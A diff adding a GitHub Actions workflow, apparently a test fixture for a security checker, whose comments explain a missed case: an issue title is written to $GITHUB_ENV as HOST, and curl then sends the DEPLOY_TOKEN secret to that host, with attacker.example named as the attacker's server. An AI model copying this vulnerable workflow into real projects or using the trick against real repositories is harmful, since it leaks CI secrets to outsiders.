@@ -1,0 +1,25 @@
+# situation: on issues, a step writes the first word of the issue's title to
+#   $GITHUB_ENV as HOST, and the next step sends a request with curl and the
+#   secret DEPLOY_TOKEN to the host HOST names.
+# reason: a todo (the same file): HOST has the attacker's word, so the
+#   secret goes to the attacker's host.
+# cause: the rule reads the variables of the workflow's env, not what a step
+#   before writes to $GITHUB_ENV.
+# attack: the attacker opens an issue titled attacker.example, the host of a
+#   server the attacker runs.
+# attack-run-behavior: curl sends the request with Authorization: Bearer and
+#   the value of DEPLOY_TOKEN to attacker.example, and the server of the
+#   attacker logs the header.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - env:
+          TITLE: ${{ github.event.issue.title }}
+        run: |
+          echo "HOST=${TITLE%%[[:space:]]*}" >> "$GITHUB_ENV"
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$HOST/status"
